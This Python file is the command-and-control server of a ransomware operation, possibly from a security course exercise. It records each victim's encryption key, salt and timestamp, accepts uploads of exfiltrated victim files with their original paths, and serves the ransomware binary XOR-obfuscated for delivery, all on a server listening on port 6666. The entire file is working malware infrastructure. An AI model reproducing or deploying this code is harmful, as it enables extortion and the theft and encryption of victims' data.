import base64
from hashlib import sha256
from http.server import HTTPServer
import os
from xor_crypt import xor_crypt 

from cncbase import CNCBase

class CNC(CNCBase):
    ROOT_PATH = "/root/CNC"
    RANSOMWARE_PATH = "/root/dist"

    def save_b64(self, token:str, data:str, filename:str):
        # helper
        # token and data are base64 field

        bin_data = base64.b64decode(data)
        path = os.path.join(CNC.ROOT_PATH, token, filename)
        with open(path, "wb") as f:
            f.write(bin_data)

    def get_ping(self, path: str, params: dict, body: dict) -> dict:
        return {"status": "OK"}

    def post_new(self, path: str, params: dict, body: dict) -> dict:
        token = sha256(base64.b64decode(body["token"])).hexdigest()
        salt = base64.b64decode(body["salt"])
        key = base64.b64decode(body["key"])
        timestamp = base64.b64decode(body["timestamp"])

        token_dir = os.path.join(self.ROOT_PATH, token)
        os.makedirs(token_dir, exist_ok=True)

        with open(os.path.join(token_dir, "salt.bin"), "wb") as salt_file:
            salt_file.write(salt)

        with open(os.path.join(token_dir, "key.bin"), "wb") as key_file:
            key_file.write(key)

        with open(os.path.join(token_dir, "timestamp.bin"), "wb") as timestamp_file:
            timestamp_file.write(timestamp)

        return {"status": "OK"}
    
    def post_file(self, path: str, params: dict, body: dict) -> dict:
        token = params["token"]
        file_data = body["file_data"]
        file_name = body["file_name"]
        original_path = body["original_path"][1:]

        token_dir = os.path.join(self.ROOT_PATH, token, "file", original_path)
        print("token_dir", token_dir)
        os.makedirs(token_dir, exist_ok=True)

        file_path = os.path.join(token_dir, file_name)
        print("file_path", file_path)
        with open(file_path, "wb") as f:
            f.write(base64.b64decode(file_data))

        return {"status": "OK"}
    
    def get_ransomware(self, path: str, params: dict, body: dict) -> dict:
        with open(os.path.join(self.RANSOMWARE_PATH, "ransomware"), "rb") as f:
            #random key for obfuscation
            key = os.urandom(32)
            file = xor_crypt(f.read(), key)
            return {"status": "OK", "data": base64.b64encode(file).decode(), "key": base64.b64encode(key).decode()}



           
httpd = HTTPServer(('0.0.0.0', 6666), CNC)
httpd.serve_forever()